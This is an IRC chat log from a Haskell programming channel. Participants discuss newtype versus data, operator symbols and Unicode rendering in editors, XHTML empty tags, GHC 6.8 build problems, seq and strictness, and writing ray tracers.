13:39:57 <Cale> BMeph: It was a change to my imports.h, which is used by L.hs as well as some of the other plugins when deciding what to import.
13:40:13 <jfredett> talentless: although, all I did was what ddarius said
13:40:21 <jfredett> empty :: (T Int)
13:40:42 <BMeph> Cale: Ah, "Suddenly, light dawned on Marblehead.." :)
13:40:44 <jfredett> and I added a deriving show to the T decl.
13:41:10 <Cale> BMeph: you won't see it in the darcs lambdabot yet, so far it's only in my own copy on code.haskell.org
13:41:58 <talentless> jfredett: yeah i have deriving show on the actual code causing the problem, but i decided to boil it down to a simpler example of my issue
13:42:03 <Cale> BMeph: The import situation was getting out of hand. There were about 4 or 5 places in the code where there was this huge list of imports, and you'd want them all importing the same things, so I unified that.
13:42:22 <BMeph> Cale: Good call. :)
13:43:38 <noteventime> Hey TehZorroness
13:43:50 <TehZorroness> heya :o
13:43:52 <TehZorroness> :)
13:49:01 <RayNbow> aargh dammit... computer shut itself down during a compile session...
13:49:30 <noteventime> Maybe it didn't like your code
13:49:35 <lekro> is there an idiom for a function like this: iterate2 f g x = let fx = f x in x : fx : iterate2 f g (g fx)
13:49:43 * RayNbow wonders if he can continue compiling or should clean first
13:49:55 <RayNbow> noteventime: it's more likely the system got too hot :p
13:49:59 <litb> sounds like the computer is ill
13:50:15 <jfredett> litb: hmm, an alternating iterate...
13:50:19 <jfredett> interesting.
13:50:44 <jfredett> well, sortof, anyway
13:51:07 <litb> you sure you meant me?
13:51:19 <jfredett> no, i'm not, you just tab -completed first
13:51:38 <jfredett> lekro* alternating iterate, interesting... :P
13:52:56 <lekro> I use it for something like this: iterate2 findNextEdge crossEdge (initialEdge, initialDirection)
13:53:23 <oerjan> > scanl (flip ($)) 1 (cycle [(+1),(*2)])
13:53:27 <jfredett> interesting..
13:53:28 <lambdabot>  [1,2,4,5,10,11,22,23,46,47,94,95,190,191,382,383,766,767,1534,1535,3070,3071...
13:53:32 <lekro> if I wouldn't need the results of findNextEdge I could just to iterate (crossEdge . findNextEdge) ...
13:53:42 <oerjan> lekro: ^^
13:53:53 <lekro> s/to/do
13:54:29 <jfredett> @pl (\i -> (\f g x -> x : (f x) : (i f g (g x))))
13:54:29 <lambdabot> ((ap (:) .) .) . ap ((.) . liftM2 (:)) . flip flip id . (liftM2 (.) .)
13:54:41 <jfredett> there, some nice line-noise for you
13:54:48 <litb> o.O
13:54:54 <lekro> @pl (\i -> (\f g x -> x : (f x) : (i f g (g (f x)))))
13:54:54 <lambdabot> ((ap (:) .) .) . ap ((.) . liftM2 (:)) . (`ap` flip (.)) . (liftM2 (.) .)
13:55:55 <lekro> oerjan: this looks certainly more general than my version
13:56:08 <oerjan> @pl \fs x -> scanl (flip ($)) x (cycle fs)
13:56:08 <lambdabot> flip (scanl (flip id)) . cycle
13:56:28 <lekro> :t flip id
13:56:30 <lambdabot> forall b c. b -> (b -> c) -> c
13:57:06 <lekro> :t flip ($)
13:57:07 <lambdabot> forall a b. a -> (a -> b) -> b
13:57:11 <lekro> ah.
13:57:47 <oerjan> @pl \x fs -> scanl (flip ($)) x (cycle fs)
13:57:47 <lambdabot> (. cycle) . scanl (flip id)
13:59:24 <awesame> why should I ever prefer data over newtype?
13:59:46 <noteventime> Because you can't newtype to define anything new?
13:59:57 <mrd> data Foo = F Int String
14:00:07 <awesame> I guess I still don't understand newtype
14:00:14 <awesame> is it limited to unary constructors?
14:00:19 <noteventime> awesame: You copy some other type
14:00:28 <noteventime> awesame: But give it a new identity
14:00:39 <noteventime> So that it has the same data
14:00:47 <noteventime> But isn't the same type
14:01:06 <awesame> that's what I hear, but I feel like that's what "data Foo = F Int" already does
14:01:08 <noteventime> So typeclasses defined for the first type won't be used for the newtyped type
14:01:16 <mrd> also, newtype is strict
14:02:36 <oerjan> awesame: data Foo has slightly different semantics that mean it cannot be implemented as the contained value after throwing away the type
14:02:54 <oerjan> e.g. F undefined is not undefined for data
14:03:11 <awesame> I see
14:03:28 <jfredett> awesame: general rule of thumb, if you can write your code using a newtype, it might be worth doing
14:03:39 <mrd> newtype also does not allow multiple constructors
14:03:52 <awesame> and this error http://codepad.org/PSZ86uFr confirms my theory that newtype is limited to unary constructors
14:03:54 <mrd> data Either a b = Left a | Right b
14:04:13 <awesame> ah, just one unary constructor
14:04:19 <awesame> I see
14:04:32 <mrd> newtype is, in a way, a premature optimization embedded in the spec
14:05:04 <litb> o.O
14:05:44 <noteventime> Why are there union and difference functions for lists but no difference function?
14:05:50 <noteventime> err, union and intersect, I mean
14:05:56 <oerjan> noteventime: (\\)
14:05:57 <mrd> there is, it's called \\
14:06:02 <noteventime> Ohh
14:06:33 <noteventime> Why suddenly use an infix operator?
14:06:46 <mrd> \ is classically set-difference /shrug
14:07:12 <noteventime> I see
14:08:13 <mrd> now with unicode, we need to switch to the nice symbols!
14:08:52 <noteventime> Wouldn't it be rather awkward to type them though?
14:09:00 <noteventime> If one wasn't using a special editor
14:09:11 <awesame> I would enjoy writing haskell in an editor with pretty symbols, using a big damn keyboard
14:09:21 <mrd> emacs has support for various input methods
14:09:27 <mrd> one of them is TeX-style
14:09:32 <mrd> that could work
14:09:42 <noteventime> Well, it would certainly look neat :)
14:09:54 <noteventime> Especially to have a lambda
14:10:18 <mrd> you could probably arrange that already. i know some people did it for scheme-mode.
14:10:18 <awesame> and member-of instead of <-
14:10:28 <mrd> \in
14:10:39 <awesame> yeah, \in
14:10:40 <noteventime> awesame: Yes
14:11:31 <noteventime> And inequation
14:12:46 <awesame> I'm a little mad at haskell for choosing \= over the industry-standard !=
14:12:55 <johnnowak> i'm furious
14:13:01 <awesame> the tiltiness was not worth it
14:13:09 <noteventime> It does look better though
14:14:08 <kpreid> (≠) = (/=)
14:14:43 <johnnowak> i hope someone can explain to me one day why papers involving haskell often insist on rendering otherwise valid syntax with non-ascii symbols
14:14:44 <Gilly> we could design the language such that the core functions would be like "a_really_long_name_for_not_equal_to" which would force the developers write shorthands (that they would of course like)
14:14:48 <awesame> er, /=
14:15:44 <dolio> It looks nicer?
14:15:50 <johnnowak> that's an awful reason
14:15:59 <shachaf> johnnowak: Why?
14:16:00 <johnnowak> pictures of bunnies might look nicer too
14:16:13 <noteventime> Wouldn't be very readable though
14:16:25 <awesame> haskell syntax contains a lot of ascii-art
14:17:08 <awesame> I think I might prefer for it to live with the ascii character set, instead of trying to draw pictures of the symbols it really wants
14:17:28 <johnnowak> shachaf: seems silly to have me guess if some beautifully rendered arrow is actualy =>, ==>, ->, etc
14:17:33 <awesame> on the other hand, once you figure out what they're supposed to look like, you're good
14:17:41 <pejo> johnnowak, you're free to use the ascii representation in your papers though.
14:17:48 <noteventime> can't you just (!=) = (/=)?
14:17:58 <johnnowak> pejo: of course
14:17:59 <shachaf> johnnowak: Can you give an example where it's confusing?
14:18:29 <shachaf> johnnowak: Everything I've seen was very similar to the ASCII, only (arguably) prettier.
14:18:30 <johnnowak> shachaf: it was only confusing when i didn't know haskell but was trying to pull something from the examples
14:18:50 <awesame> early (well, earlier) in my experience with haskell, I would sometimes see it in papers and not know how to enter the code I was looking at
14:18:53 <awesame> that was annoying
14:18:59 <johnnowak> awesame: exactly
14:19:37 <noteventime> Shouldn't you learn the basic operators pretty quickly though?
14:19:41 <noteventime> I think that's a minor problem
14:19:56 <awesame> it didn't stop me, but it was irritating
14:20:26 <johnnowak> noteventime: minor or not, it should be a non-existant problem
14:20:54 <BMeph> I don't understand why we (the international computer-using community) have gone to such an effort to make a replacement symbol set for ASCII, then refuse to use it.
14:21:15 <kpreid> because keyboards are hard
14:21:21 <noteventime> johnnowak: Well, if you use normal ASCII it looks uglier
14:21:22 <kpreid> (well, not solely, but that's most of it)
14:21:25 <awesame> I think it's because people are afraid of learning new keyboards
14:21:25 <noteventime> So you get a different prolbem
14:21:34 <BMeph> kpreid: Keyboards are easy - just go shopping! ;p
14:21:53 <awesame> qwerty layout is bad for a lot more reasons than just its character set, and yet we keep using it
14:22:03 <johnnowak> noteventime: that's just dishonest. there's no usability problem representing code in a way that's actually enterable.
14:22:18 <noteventime> johnnowak: It doesn't look as pretty though
14:22:20 <noteventime> :)
14:22:21 <mrd> industry standard (!=)?
14:22:27 <mrd> Lisp uses /= as well
14:22:31 <noteventime> mrd: C standard
14:22:32 <noteventime> :p
14:22:55 <mrd> C should use the industry standard /=, since Lisp predates C
14:22:58 <awesame> many languages use !=
14:23:01 <awesame> perhaps most
14:23:13 <wli> Prolog uses \=
14:23:16 <noteventime> None of the interesting ones do :)
14:23:21 <awesame> certainly most lines of code!
14:23:26 <wli> Fortran...
14:23:30 <mrd> awesame: many languages get scoping wrong
14:23:45 <mrd> <>
14:24:16 <dolio> Smalltalk apparently uses ~=
14:24:21 <mrd> awesame: I hope we're not stuck with "industry standard" broken scoping too :P
14:24:40 <kpreid> Lua also uses ~=
14:25:08 <awesame> I guess my inclination is to reach out to the average programmer where possible
14:25:24 <johnnowak> Haskell: Now with more average programmers!
14:25:32 <awesame> haskell seems geared more to make the average math major comfortable
14:25:53 * mrd doubts that
14:26:07 <noteventime> Why would you want average programmers?
14:26:13 <mrd> the average math major is comfortable with matlab, one of the most horribly grotesque programming languages ever devised
14:26:17 <noteventime> I'm not saying they are not welcome
14:26:50 <awesame> it's not that I want average programmers so much as that I want interesting languages to have an easier time supplanting, e.g., Java
14:26:52 <johnnowak> "Avoid success at all costs" seems like a pretty good idea
14:27:09 <awesame> mrd: ok true
14:27:35 <dolio>  /= vs. != isn't going to be a significant factor in Haskell overtaking Java.
14:27:35 <mrd> I think the whole "functional" vs "OOP" thing is going to send java programmers spinning more than /= vs !=
14:28:06 <awesame> it's not a big issue by itself
14:28:16 <kpreid> if every new language does things exactly the same as previous languages, except for those the designers really care about, then the little things will never get improved
14:28:19 <mrd> "Where's my Visitor Pattern!?!"
14:28:37 <awesame> but I think you could go a long way making functional languages look more familiar to a lot of programmers, and that helps with adoption
14:28:44 <ddarius> mrd: Visitor pattern is FP
14:28:50 <kpreid> foo [] = ...; foo (x:xs) = ... -- there's your visitor pattern
14:28:55 <mrd> hehe
14:28:57 <awesame> Scala is getting pretty good traction among Java refugees, I think
14:29:15 * kpreid should look at Scala...
14:29:21 <dabblego> awesame, it's also suffering as a result
14:30:11 <noteventime> Bah, if you try to make things familiar they end up to similar
14:30:33 <noteventime> I'm not saying Scala is a good functional language for Java programmers who want to "improve"
14:30:38 <twanvl> or worse, they look the same but are actually different beneath the surface
14:30:39 <awesame> kpreid: I agree with that.  sometimes it's nice for a language to forget about being comprehensible for new users and just be creative about how things could be better.  I like that about Haskell.
14:30:47 <mrd> if you think /= is different, try list and array indexing :)
14:31:23 <dabblego> the typical unskilled "Java programmer" doesn't learn anything by picking up Scala; they just apply all their stupid ideas in a language that permits it
14:31:23 <dolio> List indexing isn't that different.
14:31:44 <awesame> mrd: /= is just an example.  changing it on its own wouldn't make any difference, I agree.
14:31:44 <dolio> genericIndex should be sufficiently verbose for a Java programmer. :)
14:32:22 <ska-fan> Does an editor exist that shows /= as ≠ and the other thing as ∈ and so on?
14:32:23 <mrd> awesame: I like /=, actually, because it looks more akin to the \not\eq operator
14:32:41 <mrd> you can arrange lhs2TeX to do that
14:32:58 <ska-fan> I mean I want the source code that I'm editing to look like that
14:33:13 <awesame> it would be cute to have an editor that lets you type the ascii-art, but displays the symbols
14:33:13 <mrd> emacs probably can do it, if it can do \lambda for lambda
14:33:13 <ska-fan> not a hardcopy
14:33:23 <dolio> leksah does it.
14:33:26 <awesame> like the way entering Japanese with kana works
14:34:23 <ska-fan> dolio: do you have a screenshot? :)
14:34:35 <awesame> ooo, leksah
14:34:47 <dolio> Let me make one...
14:37:19 <awesame> aw, too bad it's gtk.  I'd use a windows version.
14:37:41 <awesame> I wonder if it's possible to get it going with gtk on windows
14:38:08 <ska-fan> the initial release announcement mentions that it runs on windows
14:38:37 <ska-fan> and gtk is quite cross-platform, too. The GIMP exists for windows.
14:38:52 <mikael> ska-fan: check out http://www.emacswiki.org/cgi-bin/emacs-en/PrettyLambda
14:38:53 <lambdabot> Title: EmacsWiki: Pretty Lambda
14:39:37 <mikael> in particular the "Smalltalk, Ocaml and Haskell" section
14:39:37 <awesame> I should make an option for codepad to render haskell with the pretty unicode characters
14:39:46 <dolio> http://img299.imageshack.us/my.php?image=snap14qb4.png
14:39:48 <mikael> though I haven't tried it in ages, and then only on Linux
14:40:06 <mikael> dolio: nice :)
14:40:30 <dolio> The double arrows are >>=
14:40:35 <dolio> Not sure if I like that.
14:40:43 <dolio> But it's configurable somewhere.
14:40:51 <mikael> yeah, they don't really look like binds
14:41:32 <dolio> == being three bar equals while /= is two bar not equals is kind of off, too.
14:42:02 <mikael> the whole idea has about the same problems as tabs
14:42:12 <awesame> is there a list somewhere of all the symbols people typically use in haskell in papers?
14:42:48 <dolio> Yeah, it can possibly mess up your indenting.
14:42:51 <olsner> is the +-in-ring a (++)?
14:42:58 <dolio> Since a multi-character symbol can be collapsed into one character.
14:43:02 <dolio> olsner: Yeah.
14:43:46 <awesame> you could keep track of collapses and propagate them into the indentation within the following box
14:43:57 <awesame> if you wanted to get all fancy
14:44:11 <dolio> There are more symbols than are in that screenshot, too.
14:44:21 <dolio> I think it does a couple other Greek letters, for instance.
14:44:25 <Cheery> what is the best place to learn about the standard libraries and third-party -libraries haskell has?
14:44:35 <dolio> And 'not' turns into a not symbol.
14:44:53 <Cheery> for instance, I saw a marshal -module in one slide thing, were never heard about it before
14:46:08 <Cheery> also, I'd want to read/write binary file formats in haskell, further going down on that last question, what libraries could be of use for me?
14:46:27 * dolio <*> dinner
14:46:33 <mrd> binary
14:46:51 <mrd> see haskell.org for all details
14:47:52 <mrd> also, hackage.haskell.org in particular
14:48:04 <jfredett> :t (<*>)
14:48:09 <lambdabot> forall (f :: * -> *) a b. (Applicative f) => f (a -> b) -> f a -> f b
14:48:15 <jfredett> is that a synonym for ap?
14:48:20 <jfredett> :t ap
14:48:21 <lambdabot> forall (m :: * -> *) a b. (Monad m) => m (a -> b) -> m a -> m b
14:48:36 <jfredett> interesting...
14:51:35 <dbpatterson> with Text.Regex.subRegex, how do you use the match in the substitute? ie, I want "el" "hello" fn(match) -> "h{whatever fn returned}lo"
14:52:43 <conal> @seen Cale
14:52:43 <lambdabot> Cale is in #haskell-overflow, #haskell and #ghc. I last heard Cale speak 1h 10m 40s ago.
14:52:58 <Cale> I'm here
14:53:34 <conal> Cale: i think you told me a while ago about composing monads m . n.  the trick is to find a foo :: n (m a) -> m (n a).
14:53:46 <conal> did i hear that from you?  do you have a reference?
14:53:52 <Cale> yeah
14:54:01 <wli> springschool95.pdf
14:54:18 <Cale> You might look up "Distributive Law", which is the general name for such a thing
14:54:36 <Cale> There are some nice videos on YouTube about category theory where they discuss it.
14:54:54 <noteventime> oo
14:55:00 <Cale> http://uk.youtube.com/user/TheCatsters
14:55:01 <lambdabot> Title: YouTube - TheCatsters's Channel
14:55:10 <conal> thx.  i thought i'd try adding an Monad instance for (m :. n) in TypeCompose.
14:55:11 <Cale> http://uk.youtube.com/profile_play_list?user=TheCatsters
14:55:12 <lambdabot> Title: YouTube - TheCatsters's Playlists
14:55:19 <noteventime> Thanks Cale :D
14:55:42 <Cale> No problem
15:06:47 <cin> anyone know how to get an empty xhtml tag with Text.Html.Strict?
15:06:59 <cin> i'm after <div class='clear'></div>, but i am getting <div class='clear'/>
15:07:15 <cin> clear = thediv ! [theclass "clear"] << noHtml
15:07:30 <Baughn> cin: That /is/ an empty xhtml tag
15:07:31 <cin> i tried << "", but with the same result
15:07:32 <mrd> what's the difference?
15:07:39 <cin> i don't think the latter is valid
15:07:43 <Baughn> cin: You may be looking for html
15:07:49 <mrd> it is an empty XML tag
15:07:52 <cin> no i'm not
15:08:02 <cin> they behave differently in my browser
15:08:04 <Baughn> cin: If you want "<div></div>", yes you are
15:08:13 <Baughn> cin: Your browser is broken. Or your document is. Validate it.
15:08:39 <cin> <div/> is definitely valid?
15:08:43 <Baughn> Yes
15:08:49 <shachaf> cin: Maybe you're sending it with the wrong content-type?
15:08:59 <Baughn> cin: Run it through the w3c validator
15:10:19 <Baughn> cin: XHTML has nice effects on things like <textarea>, since you can have an empty textarea without messing up indentation. I rather like it.
15:10:54 <cin> yes
15:11:30 <Cheery> ohwell, at least on browsers, it is crapped down
15:13:01 <SamB> cin: probably your browser doesn't support XHTML
15:14:42 <cin> no, i was comparing <div>foo</div> to <div/> or <div></div>
15:14:49 <DQuest> cin: I'm fairly certain that <tag></tag> == <tag/> in general
15:15:16 <DQuest> oh hang on, perhaps not.  I'm not sure you can have <br></br> instead of <br/>
15:15:34 <SamB> DQuest: eh?
15:15:48 <SamB> they correspond with the same infoset, don't they?
15:16:13 <DQuest> Possibly <tag></tag> <= <tag/>?
15:16:51 <SamB> I'm not aware of that sort of partial ordering on infosets
15:17:31 <litb> what do you want to say with that DQuest ?
15:18:03 <Baughn> DQuest: HTML wants plain <br>, and XHTML requires you to use <tag /> instead of <tag></tag>, so I dare say you're right
15:18:09 <litb> everywhere where you can do <t/> you can do <t/> ?
15:18:19 <litb> err,
15:18:34 <SamB> Baughn: I think XHTML is out of line in saying that
15:19:10 <Baughn> SamB: Technically, isn't it XML saying that?
15:19:19 <SamB> XML never SAID that
15:19:35 <SamB> XML says they are the same thing, does it not?
15:19:45 <Baughn> <foo></foo> isn't the same as <foo/> - the former has an empty string inside, at least with this library - so I can see <br></br> being illegal
15:20:04 <Baughn> SamB: I'd have to actually read and figure out the xml spec to answer that, to be honest.
15:20:16 <Baughn> SamB: But /here/, with /this/ library, they differ
15:20:51 <SamB> Baughn: that doesn't mean that the documents are different in meaning
15:21:03 <Baughn> SamB: Who's assigning the meaning?
15:21:21 <Baughn> SamB: If XHTML does say "br must have no sub-elements", and an empty string counts as a sub-element..
15:22:05 <SamB> well, xml-infoset doesn't seem to have string items, only character items
15:22:06 <DQuest> er, as in any tag where you can write <tag></tag> you can write <tag/>, but not vice versa.
15:22:29 <DQuest> Then again, I'd have to check the spec to be sure
15:22:32 <SamB> also, a string can't be an element...
15:23:01 <Baughn> It's calling it a CDATA element. I call it a string.
15:23:10 <Heffalump> has anyone built regex-tdfa on ghc 6.8?
15:23:11 <Cheery> "The IBM 360 object format was designed in the early 1960s, but remains in use today. It was originally designed for 80 column punch cards..."
15:23:26 <SamB> http://www.w3.org/TR/xml-infoset/#infoitem.element
15:23:27 <lambdabot> Title: XML Information Set (Second Edition)
15:23:34 <Cheery> somehow started to laugh when read that
15:24:07 <olsner> Heffalump: I get Text/Regex/TDFA/RunMutState.hs:13:32: parse error on input `#'
15:24:19 <Heffalump> indeed.
15:24:27 <Baughn> SamB: That certainly does imply that there should be no difference. Hmm..
15:24:28 <SamB> Cheery: most 360 things were originally designed for 80 column punch cards
15:25:14 <Heffalump> I don't quite understand it; I don't think it's CPP getting confused as I tried removing the preprocessor directives and the CPP specification in the module and the header file and it still broke.
15:25:38 <Cheery> SamB: interesting
15:27:00 <olsner> Heffalump: probably a GHC primitive that's changed names
15:27:19 <olsner> more specifically, one of these: MutableByteArray#,RealWorld,Int#,sizeofMutableByteArray#,unsafeCoerce#
15:27:29 <Heffalump> are those actually handled specially by the parser?
15:27:35 <Heffalump> rather than being parsed then recognised
15:28:02 <conal> olsner: try {-# LANGUAGE MagicHash #-}
15:28:11 <Heffalump> oh, I didn't know about that pragma
15:28:35 <conal> 'ghc --supported-languages' to the rescue
15:28:37 <Cheery> SamB: does somebody still sell punch card machines?
15:29:19 <Cheery> I mean, tools adapted to read those things on modern computers and tools to make them
15:29:22 <olsner> that did solve the parse error... and now I notice, regex-tdfa needs more porting for 6.8 (base-package split for example)
15:29:33 * Heffalump is working through it
15:29:40 <Heffalump> it also doesn't like the new bytestring
15:30:00 <Heffalump> gnngh
15:30:02 <Heffalump> ghc-6.8.1: panic! (the 'impossible' happened)
15:30:03 <Heffalump>   (GHC version 6.8.1 for i386-unknown-linux): splitFunTy
15:30:14 * Heffalump will have to get 6.8.2 and start again.
15:31:19 <ddarius> "By now, a number of computer languages are explicitly based on ideas from the lambda calculus.  The most famous of these are Haskell and LISP."
15:31:32 <Cheery> LISP?
15:31:56 <Cheery> how _much_ that is based on the ideas from the lambda calculus?
15:32:03 <conal> s/Lisp/Scheme/
15:32:20 <Baughn> No, I bet it's referring to the original LISP, in this case
15:32:33 <Baughn> That was based pretty directly
15:32:34 <Cheery> I thought they were just list processing units
15:32:51 <newsham> ?go Recursive Functions of Symbolic Expressions and Their Computation by Machine
15:32:53 <lambdabot> Plugin `search' failed with: Lib.URL.isTextHTML: getHeader failed
15:33:10 <cin> O_O
15:34:06 <conal> there seem to be mixed stories about how much or little the lambda calculus influenced McCarthy
15:35:22 <ddarius> Well, one can just ask him.
15:35:47 <olsner> is he still even alive?
15:36:03 <Riastradh> Yes.
15:37:20 <SamB> Cheery: they don't use physical cards for those formats anymore, obviously ;-P
15:37:21 <olsner> ah, cool
15:37:26 <SamB> but sometimes they still call them cards
15:37:34 <newsham> my lang is based on the ideas of lambda calculus :)  http://www.thenewsh.com/%7Enewsham/lambda/
15:37:35 <lambdabot> Title: Directory /~newsham/lambda/
15:37:44 <newsham> working on a mini (untyped) haskellish thing
15:38:02 <newsham> 244loc
15:39:05 <Heffalump> was parsec distributed in ghc 6.8.1 but omitted from 6.8.2?
15:39:51 <olsner> I got parsec with my 6.8.2?
15:40:10 <Baughn> Heffalump: It's in the extra libraries now
15:41:03 <Heffalump> I just installed by tarballs on linux from the GHC site.
15:41:13 <Heffalump> And AFAIK 6.8.1 had parsec and 6.8.2 seems to be missing it.
15:41:48 <SamB> most things are in extra now
15:41:57 <SamB> why are you installing from tarballs?
15:42:10 <Heffalump> what else would I install from?
15:42:15 <SamB> packages?
15:42:47 <Heffalump> I don't want to replace the system ghc
15:43:18 <dino-> I installed this too: http://haskell.org/ghc/dist/6.8.2/maeder/ghc-6.8.2-i386-unknown-linux.tar.bz2
15:43:20 <lambdabot> http://tinyurl.com/3cqaam
15:43:36 <dino-> After being advised by people here and being unwilling to take my Debian system up to unstable.
15:43:40 <Heffalump> I thought that was the same as the other apart from the readline dep.
15:44:21 * Heffalump will try it though
15:44:36 <dino-> SamB: When you say packages, what do you mean?
15:45:55 <dino-> Heffalump: Ya, I had to install readline4 on my system to make it work. Debian testing is at 5.
15:46:07 <dino-> But that was relatively painless after locating the proper .deb
15:46:09 <Heffalump> it works, it's just missing parsec
15:46:53 <dbpatterson> Text.XHtml seems to automatically escape strings that are used with the combinator library, why, and how can I turn this off?
15:47:15 <SamB> http://naesten.dyndns.org:8080/open_close_br.xhtml validates for me...
15:47:17 <dino-> Heffalump: You can't :m +Text.ParserCombinators.Parsec in ghci?
15:47:28 <Heffalump> I didn't try, but cabal said it was missing.
15:47:53 <dino-> You may need to add 'parsec' to build-depends
15:48:06 <dbpatterson> aha! primHtml!
15:48:08 <dino-> If this is wrong, please somebody jump in here and say so.
15:48:10 <Heffalump> that would cause a different error
15:48:27 <olsner> parsec is already in the build depends, afaics
15:48:27 <Heffalump> namely a module not being found on compiling a specific file
15:48:45 <dino-> huh
15:48:47 <Heffalump> well, I just saw the maeder tarball install parsec.
15:49:04 <Heffalump> if this works I shall be happy and not question things.
15:49:13 <dino-> That's the one linked from the GHC download page.
15:49:24 <Heffalump> there are two linked from that page
15:49:27 <Heffalump> I had installed the first one.
15:49:31 <dino-> ah
15:49:48 <dino-> Oh, the meader one is the deps on libreadline.so.5
15:49:53 <Heffalump> right.
15:50:10 <dino-> Sorry for the confusion.. but I actually installed http://haskell.org/ghc/dist/6.8.2/ghc-6.8.2-i386-unknown-linux.tar.bz2
15:50:13 <dino-> :/
15:50:23 <dino-> (the first one that you're saying is parsec-fubar)
15:50:24 <Heffalump> well, I'd already tried that :-)
15:50:25 <Cheery> you know, punched cards are sort of decorative
15:51:02 * Heffalump has now got past that problem with the other (i.e. the maeder) tarball.
15:51:07 <Heffalump> However I still get GHC impossibles.
15:53:15 <dino-> Heffalump: What's it doing?
15:53:20 <Heffalump> see above
15:53:50 <Heffalump> 23 mins ago or so
15:55:32 <dino-> I see
15:56:24 * Heffalump realises that he only needs it (regex) for one part of his app and considers just building that with 6.6
15:56:51 * Heffalump gives up for tonight and goes to bed, anyway
15:56:57 <dino-> :/
15:58:07 <cin> dbpatterson: yeah, primHtml + showHtmlFragment
16:11:25 <dbpatterson> is there a variant of words that doesnt cut out the newlines? ie, so unwords (words "this\nword") will return "this\nword" instead of "thisword"
16:11:38 <dbpatterson> errm, correct that, instead of "this word"
16:12:31 <OceanSpray> write your own?
16:13:07 <dbpatterson> OceanSpray: that's the next step, I just didnt want to do it is "wordsN" existed already
16:14:29 <facedown> lol Twey
16:14:32 <facedown> if you're even here
16:14:32 <facedown> ;p
16:14:34 <facedown> muted
16:14:46 <facedown> aw
16:15:08 <gnuvince_> I have a sum function that should be tail recursive, but I get a stack overflow at runtime.  I am using GHC 6.8.2.  Can anyone explain to me what the problem is?
16:15:43 <SamB> gnuvince: probably the problem is that it IS tail recursive
16:15:58 <sarehu> > let f c = isSpace c && c /= '\n' in filter (not . f . head) (groupBy f "so what this\nword blargh")
16:16:29 <SamB> ... but not strict
16:16:39 <SamB> in the right places
16:16:48 <gnuvince_> ah
16:17:09 <gnuvince_> SamB: I put (n `seq` n+x) and it works fine now.
16:21:31 <mrd> sum l = foldl' (+) 0 l
16:27:43 <OceanSpray> how hard is it to write a ray-tracer?
16:28:31 <newsham> http://www.ffconsultancy.com/languages/ray_tracer/comparison.html
16:29:15 <Baughn> OceanSpray: Mind you, a /good/ one would be rather larger.
16:29:30 <OceanSpray> hm
16:30:03 <dabblego> didn't Lenart Augusston write one in Haskell?
16:30:24 <newsham> http://augustss.blogspot.com/2007/11/benchmarking-ray-tracing-haskell-vs.html
16:30:43 <newsham> ?bot
16:31:33 <Baughn> OceanSpray: FOr comparison, povray has several megabytes of compressed source code
16:32:13 <Baughn> OceanSpray: ..or you could ask mathematica to solve the render equation. That'd be a small tracer. It'd never succeed, but it'd be small.
16:32:22 <newsham> baughn: and vista is much bigger than unix
16:32:39 <Baughn> newsham: I don't think that's a matter of quality, in that case
16:32:51 <newsham> i'm just saying.. you can make anything big
16:33:05 <Baughn> Of course
16:33:11 <Baughn> My implication was that povray has several megabytes of /useful/ source code
16:34:44 <ddarius> OceanSpray: Writing a simple raytracer is stupid easy.
16:35:19 <OceanSpray> I have no idea where to start.
16:35:44 <ddarius> OceanSpray: There are quite a few online resources that will explain the basics.
16:36:08 <newsham> including ones i pasted urls for
16:36:29 <Baughn> OceanSpray: A reverse raytracer is considerably slower for no good reason, but it's also considerably simpler for very good results. Try that?
16:44:12 <Cale> OceanSpray: It's very easy to write a basic raytracer in about a page of Haskell code.
16:45:06 <OceanSpray> I think I get how they work now.
16:45:27 <OceanSpray> and since you guys say it's so easy, I'm going to do it cold turkey.
16:45:31 <mrd> Cale: ... in the type system?
16:48:34 <Michaael> Can someone explain me why seq takes two arguments ?
16:49:16 <OceanSpray> what's the point of taking one argument?
16:49:20 <biouser> >makelist = 1:makelist
16:49:47 <Michaael> OceanSpray: seq force the evaluation of an expression
16:49:53 <Michaael> seq a b = b
16:50:02 <mrd> forces the evaluation of a
16:50:32 <olsner> OceanSpray: seq as a strictifying id makes at least as much sense to me
16:50:38 <OceanSpray> if you want forced evaluation, just use strictness annotation.
16:51:00 <ddarius> olsner: id is strict
16:51:22 <ddarius> seq must have (at least) two arguments to do what it does
16:51:28 <Michaael> ok
16:51:58 <biouser> parse error on input '='
16:52:42 <resiak> I think looking at seq x x was what made me get my head around seq having two arguments
16:52:52 <int-e> > let makelist = 1 : makelist in makelist
16:52:58 <ddarius> seq x x == x
16:53:02 <resiak> exactlny
16:53:07 <gnuvince_> ddarius: does seq have two arguments to allow the strict evaluation of a chain of expression such as a `seq` b `seq` c ?
16:53:11 <resiak> it only forces x's value when .. x's value is force.
16:53:20 <int-e> @bot
16:53:42 <OceanSpray> > 1 + 1
16:54:06 <Cale> mrd: heh
16:54:17 <Cale> mrd: In the type system would be a bit trickier.
16:54:19 <ddarius> gnuvince_: No, it has two arguments because you need something to demand the seq statement, so it has to return something relevant, but you explicitly want to force the computation of something that is not (yet) relevant.
16:54:50 <Cale> mrd: You'd need things like a type-level square root approximation.
16:55:06 <ddarius> Easy enough once you have a representation for numbers.
16:55:09 <Cale> Probably not impossible.
16:55:39 <gnuvince_> ddarius: wouldn't id work just as well to force the evaluation of an argument?
16:56:04 <int-e> gnuvince_: force the evaluation of an argument, when?
16:56:43 <Cale> gnuvince_: id does nothing
16:56:51 <gnuvince_> int-e: let's say you want to force addition, why use 0 `seq` n + x?  Wouldn't id n + x work?
16:56:57 <Cale> gnuvince_: no
16:57:07 <Cale> er, 0 `seq` n + x doesn't work either
16:57:09 <int-e> gnuvince_:  0 `seq` anything  is silly
16:57:18 <Cale> That forces the evaluation of 0, before resulting in n + x
16:57:26 <Cale> The (+) won't get evaluated until later.
16:57:34 <johnnowak> 0 needs to start pulling his weight
16:58:02 <int-e> gnuvince_: here's a use of seq that actually does something:   let x = 2*2 in x `seq` [x].
16:58:18 <Cale> Well, of course it'll proceed with (+) in any case, since you're already evaluating the expression.
16:59:20 <gnuvince_> int-e: so the value 4 will be put inside the array instead of the promise to evaluate 2*2?
16:59:25 <gnuvince_> s/array/list
16:59:30 <Cale> gnuvince_: right
16:59:30 <int-e> gnuvince_: when that expression is evaluated, it results in [x], but before that happens, x is evaluated to 4, so instead of [2*2] (with the 2*2 still to be evaluated) you get [4]
16:59:44 <Cale> gnuvince_: *when* the let is evaluated
17:00:41 <Cale> gnuvince_: That is, if you were to use case to pattern match that expression against (:) or [], that would force the evaluation of 2*2 right then
17:00:51 <Cale> rather than when the matched head of the list was demanded
